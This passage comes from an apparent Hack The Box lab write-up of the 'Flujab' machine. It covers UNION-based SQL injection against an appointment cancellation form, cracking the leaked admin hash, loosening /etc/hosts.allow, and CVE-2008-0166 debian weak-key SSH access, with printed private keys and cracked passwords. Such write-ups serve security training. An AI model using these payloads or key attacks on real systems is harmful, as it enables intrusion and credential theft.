------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fourth-column--email&quot;&gt;Fourth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--7&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:48:47 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:access
Message-ID: &amp;lt;f2306132c2238cf545023e952591045d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--                                           
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;fifth-column--access&quot;&gt;Fifth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-stopped-right-there-to-see-if-thats-enough-lets-see-what-data-can-we-get-from-these-columns&quot;&gt;I stopped right there to see if that’s enough, let’s see what data can we get from these columns.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--8&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:01:53 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  
Message-ID: &amp;lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#                                          
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-login-name-an-email-address-and-a-link-to-a-sysadmin-console-but-we-still-need-a-password-i-dont-know-if-i-had-to-enumerate-more-until-i-get-the-column-password-but-anyway-i-just-added-password-hoping-that-theres-a-column-called-password-and-i-was-right-&quot;&gt;We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; but anyway I just added password hoping that there’s a column called password, and I was right :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--9&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:03:22 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb
Message-ID: &amp;lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#                             
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-take-a-look-at-what-we-have-&quot;&gt;let’s take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-a-sha256-hash-i-used-crackstation-to-crack-it-&quot;&gt;Password is a &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; hash. I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--th3doct0r&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;th3doct0r&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-added-sysadmin-console-01flujabhtb-to-etchosts-then-i-went-to-httpsysadmin-console-01flujabhtb-&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin-console-01.flujab.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sysadmin-console-01.flujab.htb/&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/81.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-the-direct-ip-access-error-again-but-this-time-on-port-8080-i-didnt-get-the-same-error-&quot;&gt;I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/83.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ajenti-administration-panel-note--it-wont-be-accessible-if-your-ip-wasnt-in-the-whitelist&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cve-2008-0166-user-flag&quot;&gt;CVE-2008-0166, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-in-the-first-thing-i-noticed-was-the-notepad-&quot;&gt;After getting in the first thing I noticed was the notepad :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/85.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/86.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-so-we-can-read-and-write-some-stuff-on-the-server-i-checked-the-home-directory-and-it-had-a-lot-of-users-with-a-lot-of-user-flags-&quot;&gt;Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;for-example-&quot;&gt;For example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/89.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-one-user-called-drno-had-ssh-directory-with-a-key-in-it&quot;&gt;But one user called &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; directory with a key in it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/91.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/92.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/93.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;userkey-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;userkey&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B

zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;unfortunately-it-was-encrypted-so-i-used-ssh2john-then-i-cracked-it-&quot;&gt;Unfortunately it was encrypted so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; then I cracked it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/94.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password--shadowtroll&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;shadowtroll&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;chmod-600-drnokey-then-i-used-the-key-to-ssh-as-drno-and-we-got-the-user-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 drno.key&lt;/code&gt;, then I used the key to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; and we got the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nope-we-only-got-a-connection-reset-i-went-back-to-the-administration-panel-and-took-a-look-at-etchostsallow-&quot;&gt;Nope we only got a connection reset. I went back to the administration panel and took a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts.allow&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-my-ip-address-and-tried-again-&quot;&gt;I added my ip address and tried again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/98.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/99.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;still-a-connection-reset-i-went-back-and-added-sshd--all&quot;&gt;Still a connection reset. I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd : ALL&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/100.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-now-it-doesnt-accept-the-key-it-was-just-a-troll-anyway-we-got-the-public-key-in-authorized_keys-&quot;&gt;It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/102.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-cve-2008-0166-i-downloaded-the-files-from-here-then-i-extracted-them-in-a-directory-called-cve-2008-0166-then-i-used-grep-to-search-for-the-last-line-in-the-public-key--yv8c1uai3lunrsh9rxfnox1rtz73ucmgtbacomvqy9mpi96rizm2qbe26v1mxiqnktu03cbne8tdd96txonmaxe-through-all-files-&quot;&gt;I tried &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt;&lt;/a&gt;. I downloaded the files from &lt;a href=&quot;https://github.com/g0tmi1k/debian-ssh&quot;&gt;here&lt;/a&gt; then I extracted them in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;cve-2008-0166&lt;/code&gt;. Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; to search for the last line in the public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&lt;/code&gt; through all files :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grep -r -n &quot;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&quot; cve-2008-0166/*&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-matched-this-public-key--debian_ssh_rsa_4096_x86rsa4096dead0b5b829ea2e3d22f47a7cbde17a6-23269pub-so-i-grabbed-the-private-key--dead0b5b829ea2e3d22f47a7cbde17a6-23269-and-used-it-to-get-ssh&quot;&gt;It matched this public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub&lt;/code&gt; so I grabbed the private key : &lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; and used it to get ssh.&lt;/h4&gt;
&lt;h4 id=&quot;dead0b5b829ea2e3d22f47a7cbde17a6-23269-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
